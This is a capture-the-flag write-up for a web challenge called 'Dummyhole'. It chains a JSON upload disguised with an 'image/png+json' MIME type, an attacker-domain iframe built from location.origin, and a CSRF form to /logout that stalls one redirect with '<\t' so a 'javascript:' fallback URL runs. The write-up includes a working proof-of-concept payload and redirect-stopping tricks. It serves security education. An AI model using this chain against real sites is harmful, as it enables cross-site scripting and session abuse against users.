# Dummyhole

Another xss and another things to learn here :)


Im not going to show the entire challenge source code, but this the main parts are this snip codes

you can upload file but the content-type should be start with `image/png` or `image/jpeg`


```js
app.post('/upload', checkOrigin, requireAuth, uploadLimiter, upload.single('image'), async (req, res) => {
	// stuff

    if (!file.mimetype || (!file.mimetype.startsWith('image/png') && !file.mimetype.startsWith('image/jpeg'))) {
      return res.status(400).json({ error: 'Invalid file: must be png or jpeg' });
    }
    // snipp code that store file into a s3 bucket object
});
```

and there is a `/logout` that

```js
app.post('/logout', requireAuth, (req, res) => {
  const sessionId = req.cookies.session;
  sessions.delete(sessionId);
  res.clearCookie('session');

  const post_id = req.body.post_id?.length <= 128 ? req.body.post_id : '';
  const fallback_url = req.body.fallback_url?.length <= 128 ? req.body.fallback_url : '';

  const logoutPage = path.join(__dirname, 'public', 'logout.html');
  const logoutPageContent = fs.readFileSync(logoutPage, 'utf-8')
    .replace('<POST_ID>', encodeURIComponent(post_id))
    .replace('<FALLBACK_URL>', encodeURIComponent(fallback_url));

  res.send(logoutPageContent);
});
```

it respond with the following script content
```html
<script>
setTimeout(() => {
  const fallbackUrl = decodeURIComponent("<FALLBACK_URL>");
  if(!fallbackUrl) {
    location.href = "/";
    return;
  }
  location.href = fallbackUrl;
}, 5000);
const postId = decodeURIComponent("<POST_ID>");
location.href = postId ? `/posts/?id=${postId}` : "/";
</script>
```

the `location.href` in the setTimeout block is vulnerable to xss via `javascript:` schema, but before that location.href hit, the `location.href = postId ? ...` will execute

and the `posts` page
```html
<body>
  <div class="post-container">
    <h1 id="title">Loading...</h1>
    <div class="description" id="description"></div>
    <iframe id="imageFrame" credentialless></iframe>
  </div>

  <script type="module">
    const params = new URLSearchParams(location.search);
    const postId = params.get('id');

    if (!postId) {
      document.getElementById('title').textContent = 'No post ID provided';
      document.getElementById('title').className = 'error';
    } else {
      try {
        const postData = await import(`/api/posts/${postId}`, { with: { type: "json" } });

        document.getElementById('title').textContent = postData.default.title;
        document.getElementById('description').textContent = postData.default.description;

        const imageUrl = `${location.origin}${postData.default.image_url}`;
        document.getElementById('imageFrame').src = imageUrl;
      } catch (error) {
        document.getElementById('title').textContent = 'Error loading post';
        document.getElementById('title').className = 'error';
        document.getElementById('description').textContent = error.message;
      }
    }
  </script>
</body>
```


# Techniques for solve

1. Import a json file via the `image/png+json` or `image/jpeg+json` mime type to control the imported file in `/posts`
2. put our served csrf file via the `image_url` use `.attacker-domain.tld` that becomes `https://{origin}.attacker-domain.tld` because of `location.origin`
3. and for csrf we should trigger browser to stop first redirection somehow and that's possible via (https://lab.ctbb.show/research/stopping-redirects#control-of-url) technique


## Steps

1. upload a json with `image_url` set to attacker domain start with "." (mime-type: image/png+json)
2. serve a csrf that submit a post form to `/logout` with `<\t` as the `post_id` and `javascript:payload` as the `fallbackUrl`
3. send the `../../../images/<uploaded-id>` to admin to visit `http://web/posts?id=../../../images/uploaded-id` so the frame src become `http://web.attacker.tld/csrf.html`

an example CSRF

```html
<form id="csrfForm" method="post" action="http://localhost/logout">
    <input id="fallbackUrl" name="fallback_url" value="">
    <input id="postId" name="post_id" value="">
</form>

<script>
const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
const isCsrf = urlParams.get('is_csrf');

if(isCsrf !== '1') {
    open('/csrf.html?is_csrf=1')
} else {
    csrfForm.action = 'http://localhost/logout';
    postId.value = '\t<';
    fallbackUrl.value = 'javascript:alert(origin)'
    csrfForm.submit();
};
</script>
```

### Stopping redirection

```html
<script>
	location.href = "data:text/html,lol" // block by chrome
	location.href = "about:" // block in firefox but in chrome -> `about:blank#blocked`
	location.href = "https://google.com/<\t" // block because of <\t to prevent dangling html
	location.href = "https://google.com/<\n" // also block because of <\n to prevent dangling html
</script>
```

# Refreences
- https://lab.ctbb.show/research/stopping-redirects#control-of-url
- https://portswigger.net/web-security/cross-site-scripting/dangling-markup